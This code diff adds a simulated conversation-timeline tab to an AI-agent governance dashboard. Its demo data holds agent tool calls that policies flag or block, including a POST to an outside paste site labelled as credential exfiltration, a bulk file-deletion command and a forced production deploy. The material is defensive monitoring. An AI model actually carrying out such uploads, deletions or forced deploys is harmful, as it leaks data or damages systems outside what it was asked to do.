@@ -1,4 +1,5 @@
 import React, { useState, useEffect, useRef, useCallback } from "react";
+import DocsTab from "./DocsTab";
 
 // ═══════════════════════════════════════════════════════════
 // DESIGN TOKENS — SOVEREIGN AI LAB
@@ -3930,6 +3931,236 @@ function SettingsTab({ config, onConfigChange }) {
 
 
 // ═══════════════════════════════════════════════════════════
+// TAB: DEMO CONVERSATIONS — simulated conversation timeline
+// ═══════════════════════════════════════════════════════════
+const DEMO_CONVERSATIONS = [
+  {
+    conversation_id:"conv-demo-ops-001", agent_id:"claude-ops-agent",
+    turn_count:4, action_count:3, first_seen:new Date(Date.now()-3600000).toISOString(),
+    turns:[
+      { type:"turn", turn_index:1, role:"user", prompt:"List all files in the /tmp directory", timestamp:new Date(Date.now()-3550000).toISOString() },
+      { type:"action", tool:"shell", args:'{"command":"ls -la /tmp"}', decision:"allow", risk:8, policy:"base-allow", timestamp:new Date(Date.now()-3540000).toISOString() },
+      { type:"turn", turn_index:2, role:"assistant", agent_reasoning:"Listed directory safely. 12 files found.", timestamp:new Date(Date.now()-3530000).toISOString() },
+      { type:"turn", turn_index:3, role:"user", prompt:"Delete all .log files older than 7 days", timestamp:new Date(Date.now()-3500000).toISOString() },
+      { type:"action", tool:"shell", args:'{"command":"find /tmp -name *.log -mtime +7 -delete"}', decision:"review", risk:55, policy:"shell-elevated", timestamp:new Date(Date.now()-3490000).toISOString() },
+      { type:"turn", turn_index:4, role:"assistant", agent_reasoning:"Flagged for review — file deletion pattern detected.", timestamp:new Date(Date.now()-3480000).toISOString() },
+    ],
+  },
+  {
+    conversation_id:"conv-demo-research-002", agent_id:"gpt-researcher-01",
+    turn_count:3, action_count:2, first_seen:new Date(Date.now()-7200000).toISOString(),
+    turns:[
+      { type:"turn", turn_index:1, role:"user", prompt:"Research quarterly earnings for ACME Corp", timestamp:new Date(Date.now()-7150000).toISOString() },
+      { type:"action", tool:"http_request", args:'{"url":"https://api.finance.com/earnings/ACME","method":"GET"}', decision:"allow", risk:12, policy:"base-allow", timestamp:new Date(Date.now()-7140000).toISOString() },
+      { type:"turn", turn_index:2, role:"assistant", agent_reasoning:"Retrieved financial data via sanctioned API endpoint.", timestamp:new Date(Date.now()-7130000).toISOString() },
+      { type:"action", tool:"http_request", args:'{"url":"https://external-paste.io/upload","method":"POST"}', decision:"block", risk:88, policy:"credential-exfil-block", timestamp:new Date(Date.now()-7120000).toISOString() },
+      { type:"turn", turn_index:3, role:"assistant", agent_reasoning:"Upload blocked — exfiltration pattern detected by chain analysis.", timestamp:new Date(Date.now()-7110000).toISOString() },
+    ],
+  },
+  {
+    conversation_id:"conv-demo-devops-003", agent_id:"langchain-pipeline",
+    turn_count:2, action_count:2, first_seen:new Date(Date.now()-1800000).toISOString(),
+    turns:[
+      { type:"turn", turn_index:1, role:"user", prompt:"Deploy version 2.4.1 to staging", timestamp:new Date(Date.now()-1750000).toISOString() },
+      { type:"action", tool:"shell", args:'{"command":"kubectl apply -f deployment.yaml --namespace staging"}', decision:"allow", risk:22, policy:"base-allow", timestamp:new Date(Date.now()-1740000).toISOString() },
+      { type:"turn", turn_index:2, role:"user", prompt:"Now deploy to production with --force", timestamp:new Date(Date.now()-1700000).toISOString() },
+      { type:"action", tool:"shell", args:'{"command":"kubectl apply -f deployment.yaml --namespace production --force"}', decision:"review", risk:65, policy:"shell-elevated", timestamp:new Date(Date.now()-1690000).toISOString() },
+    ],
+  },
+];
+
+function DemoConversationsTab({ gs }) {
+  const [selectedConv, setSelectedConv] = useState(null);
+  const [search, setSearch] = useState("");
+
+  const filtered = DEMO_CONVERSATIONS.filter(c => {
+    if (!search) return true;
+    const q = search.toLowerCase();
+    return c.conversation_id.toLowerCase().includes(q) || c.agent_id.toLowerCase().includes(q);
+  });
+
+  const selectConv = (conv) => setSelectedConv(conv);
+  const decisionColor = (d) => d==="block"?C.red:d==="review"?C.amber:C.green;
+
+  return (
+    <div style={{display:"flex", height:"100%", background:C.bg0}}>
+      {/* Left panel: conversation list */}
+      <div style={{width:340, flexShrink:0, borderRight:`1px solid ${C.line}`,
+        display:"flex", flexDirection:"column", background:C.bg1}}>
+        <div style={{padding:"12px 16px", borderBottom:`1px solid ${C.line}`, flexShrink:0}}>
+          <div style={{fontFamily:mono, fontSize:14, fontWeight:600, color:C.p1, letterSpacing:1.5}}>CONVERSATIONS</div>
+          <div style={{fontFamily:mono, fontSize:11, color:C.p3, marginTop:2}}>
+            Agent sessions · {DEMO_CONVERSATIONS.length} total
+          </div>
+          <div style={{display:"flex", gap:6, marginTop:8}}>
+            <input value={search} onChange={e=>setSearch(e.target.value)}
+              placeholder="search conversation or agent..."
+              style={{flex:1, background:C.bg2, border:`1px solid ${C.line2}`,
+                color:C.p1, fontFamily:mono, fontSize:12, padding:"4px 10px", outline:"none"}} />
+          </div>
+        </div>
+        <div style={{flex:1, overflow:"auto"}}>
+          {filtered.map((conv, i) => {
+            const isSelected = selectedConv?.conversation_id === conv.conversation_id;
+            return (
+              <div key={conv.conversation_id} onClick={()=>selectConv(conv)}
+                style={{padding:"10px 16px", cursor:"pointer",
+                  borderBottom:`1px solid ${C.line}`,
+                  background:isSelected?C.bg2:i%2===0?C.bg1:C.bg0,
+                  borderLeft:isSelected?`3px solid ${C.accent}`:"3px solid transparent",
+                  transition:"all 0.15s"}}>
+                <div style={{fontFamily:mono, fontSize:12, color:C.p1, fontWeight:600,
+                  whiteSpace:"nowrap", overflow:"hidden", textOverflow:"ellipsis"}}>
+                  💬 {conv.conversation_id}
+                </div>
+                <div style={{display:"flex", gap:8, marginTop:4, flexWrap:"wrap"}}>
+                  <span style={{fontFamily:mono, fontSize:10, color:C.p2,
+                    padding:"1px 6px", border:`1px solid ${C.line2}`, background:C.bg3}}>
+                    🤖 {conv.agent_id}
+                  </span>
+                  <span style={{fontFamily:mono, fontSize:10, color:C.p3,
+                    padding:"1px 6px", border:`1px solid ${C.line}`, background:C.bg2}}>
+                    {conv.turn_count} turns
+                  </span>
+                  {conv.action_count > 0 && (
+                    <span style={{fontFamily:mono, fontSize:10, color:C.amber,
+                      padding:"1px 6px", border:`1px solid ${C.amber}`, background:"rgba(245,158,11,0.10)"}}>
+                      {conv.action_count} actions
+                    </span>
+                  )}
+                </div>
+                <div style={{fontFamily:mono, fontSize:10, color:C.p3, marginTop:4}}>
+                  {new Date(conv.first_seen).toLocaleString()}
+                </div>
+              </div>
+            );
+          })}
+        </div>
+      </div>
+
+      {/* Right panel: timeline */}
+      <div style={{flex:1, display:"flex", flexDirection:"column", background:C.bg0}}>
+        {!selectedConv ? (
+          <div style={{flex:1, display:"flex", alignItems:"center", justifyContent:"center"}}>
+            <div style={{textAlign:"center"}}>
+              <div style={{fontSize:48, opacity:0.3, marginBottom:12}}>💬</div>
+              <div style={{fontFamily:mono, fontSize:13, color:C.p3}}>
+                Select a conversation to view its forensic timeline
+              </div>
+              <div style={{fontFamily:mono, fontSize:11, color:C.p3, marginTop:6, opacity:0.6}}>
+                Conversations contain user prompts, agent reasoning, and governed actions
+              </div>
+            </div>
+          </div>
+        ) : (
+          <>
+            <div style={{padding:"12px 16px", borderBottom:`1px solid ${C.line}`,
+              background:C.bg1, flexShrink:0}}>
+              <div style={{display:"flex", alignItems:"center", justifyContent:"space-between"}}>
+                <div>
+                  <div style={{fontFamily:mono, fontSize:14, fontWeight:600,
+                    color:C.p1, letterSpacing:1}}>
+                    TIMELINE · {selectedConv.conversation_id}
+                  </div>
+                  <div style={{fontFamily:mono, fontSize:11, color:C.p3, marginTop:2}}>
+                    Forensic interleave of turns + governed actions
+                  </div>
+                </div>
+                <span style={{fontFamily:mono, fontSize:11, color:C.green,
+                  padding:"3px 8px", border:`1px solid ${C.green}`, background:"rgba(34,197,94,0.10)"}}>
+                  ✓ ENCRYPTED AT REST
+                </span>
+              </div>
+            </div>
+            <div style={{flex:1, overflow:"auto", padding:"12px 16px"}}>
+              <div style={{position:"relative", paddingLeft:24}}>
+                <div style={{position:"absolute", left:8, top:0, bottom:0, width:2, background:C.line2}} />
+                {selectedConv.turns.map((evt, i) => {
+                  const isTurn = evt.type === "turn";
+                  const dotColor = isTurn ? C.p2 : decisionColor(evt.decision);
+                  return (
+                    <div key={i} style={{position:"relative", marginBottom:16}}>
+                      <div style={{position:"absolute", left:-20, top:6,
+                        width:12, height:12, borderRadius:"50%",
+                        background:dotColor, border:`2px solid ${C.bg0}`,
+                        boxShadow:`0 0 6px ${dotColor}66`}} />
+
+                      {isTurn ? (
+                        <div style={{background:C.bg1, border:`1px solid ${C.line}`, padding:"12px 16px"}}>
+                          <div style={{display:"flex", alignItems:"center", gap:8, marginBottom:8}}>
+                            <span style={{fontFamily:mono, fontSize:11, color:C.p2,
+                              padding:"2px 6px", border:`1px solid ${C.p2}`, background:`${C.p2}14`}}>
+                              TURN {evt.turn_index}
+                            </span>
+                            <span style={{fontFamily:mono, fontSize:10, color:
+                              evt.role==="user"?C.accent:C.green, padding:"2px 6px",
+                              border:`1px solid ${evt.role==="user"?C.accent:C.green}`,
+                              letterSpacing:1, textTransform:"uppercase"}}>
+                              {evt.role}
+                            </span>
+                            <span style={{fontFamily:mono, fontSize:10, color:C.p3, marginLeft:"auto"}}>
+                              {new Date(evt.timestamp).toLocaleTimeString()}
+                            </span>
+                          </div>
+                          {evt.prompt && (
+                            <div style={{marginBottom:6}}>
+                              <div style={{fontFamily:mono, fontSize:10, color:C.p3, letterSpacing:1, marginBottom:3}}>USER PROMPT</div>
+                              <div style={{fontFamily:"'DM Sans',sans-serif", fontSize:13, color:C.p1,
+                                padding:"8px 12px", background:C.bg2, borderLeft:`3px solid ${C.accent}`, lineHeight:1.5}}>
+                                {evt.prompt}
+                              </div>
+                            </div>
+                          )}
+                          {evt.agent_reasoning && (
+                            <div>
+                              <div style={{fontFamily:mono, fontSize:10, color:C.p3, letterSpacing:1, marginBottom:3}}>AGENT REASONING</div>
+                              <div style={{fontFamily:"'DM Sans',sans-serif", fontSize:13, color:C.p2,
+                                padding:"8px 12px", background:C.bg2, borderLeft:`3px solid ${C.green}`, lineHeight:1.5, fontStyle:"italic"}}>
+                                {evt.agent_reasoning}
+                              </div>
+                            </div>
+                          )}
+                        </div>
+                      ) : (
+                        <div style={{background:C.bg1, border:`1px solid ${C.line}`,
+                          borderLeft:`3px solid ${decisionColor(evt.decision)}`, padding:"12px 16px"}}>
+                          <div style={{display:"flex", alignItems:"center", gap:8, marginBottom:6}}>
+                            <span style={{fontFamily:mono, fontSize:11, padding:"2px 6px",
+                              border:`1px solid ${decisionColor(evt.decision)}`,
+                              color:decisionColor(evt.decision), letterSpacing:1, fontWeight:600}}>
+                              {evt.decision.toUpperCase()}
+                            </span>
+                            <span style={{fontFamily:mono, fontSize:11, color:C.p1}}>{evt.tool}</span>
+                            <span style={{fontFamily:mono, fontSize:10, color:riskColor(evt.risk), fontWeight:600}}>
+                              risk {evt.risk}
+                            </span>
+                            <span style={{fontFamily:mono, fontSize:10, color:C.p3, marginLeft:"auto"}}>
+                              {new Date(evt.timestamp).toLocaleTimeString()}
+                            </span>
+                          </div>
+                          <div style={{fontFamily:mono, fontSize:11, color:C.p3, padding:"6px 10px",
+                            background:C.bg0, border:`1px solid ${C.line}`, overflowX:"auto"}}>
+                            {evt.args}
+                          </div>
+                          <div style={{fontFamily:mono, fontSize:10, color:C.p3, marginTop:6}}>
+                            policy: <span style={{color:C.p2}}>{evt.policy}</span>
+                          </div>
+                        </div>
+                      )}
+                    </div>
+                  );
+                })}
+              </div>
+            </div>
+          </>
+        )}
+      </div>
+    </div>
+  );
+}
+
+
+// ═══════════════════════════════════════════════════════════
 // ROOT APP
 // ═══════════════════════════════════════════════════════════
 // Tabs visible per role
@@ -3937,9 +4168,9 @@ function SettingsTab({ config, onConfigChange }) {
 // REDESIGNED — ROLE_TABS + ALL_TABS (SURGE + SETTINGS added)
 // ═══════════════════════════════════════════════════════════
 const ROLE_TABS = {
-  admin:    ["dashboard","tester","simulator","policies","surge","audit","topology","settings","apikeys","users"],
-  operator: ["dashboard","tester","simulator","policies","surge","audit","topology","settings","apikeys"],
-  auditor:  ["dashboard","surge","audit","topology","apikeys"],
+  admin:    ["dashboard","tester","simulator","policies","surge","audit","conversations","topology","settings","apikeys","users","docs"],
+  operator: ["dashboard","tester","simulator","policies","surge","audit","conversations","topology","settings","apikeys","docs"],
+  auditor:  ["dashboard","surge","audit","conversations","topology","apikeys","docs"],
 };
 
 const ALL_TABS = [
@@ -3949,10 +4180,12 @@ const ALL_TABS = [
   { id:"policies",  label:"Policy Editor",     icon:"◆" },
   { id:"surge",     label:"SURGE",             icon:"⬡" },
   { id:"audit",     label:"Audit Trail",       icon:"☰" },
+  { id:"conversations", label:"Conversations", icon:"💬" },
   { id:"topology",  label:"Topology",          icon:"◎" },
   { id:"settings",  label:"Settings",          icon:"⚙" },
   { id:"apikeys",   label:"API Keys",          icon:"🔑" },
   { id:"users",     label:"User Management",   icon:"👥", adminOnly:true },
+  { id:"docs",      label:"Documentation",     icon:"📖" },
 ];
 
 // ═══════════════════════════════════════════════════════════
@@ -4479,6 +4712,8 @@ function GovernorDashboard({ userRole="operator", userName="", onLogout=()=>{} }
           {tab==="settings"  && (userRole==="admin"||userRole==="operator") && <SettingsTab config={govConfig} onConfigChange={c=>{setGovConfig(c); setAutoKs(c.auto_ks_enabled);}}/>}
           {tab==="apikeys"   && <ApiKeysTab/>}
           {tab==="users"     && userRole==="admin" && <AdminUserManagementTab/>}
+          {tab==="conversations" && <DemoConversationsTab gs={gs}/>}
+          {tab==="docs"      && <DocsTab/>}
         </div>
       </div>
     </div>
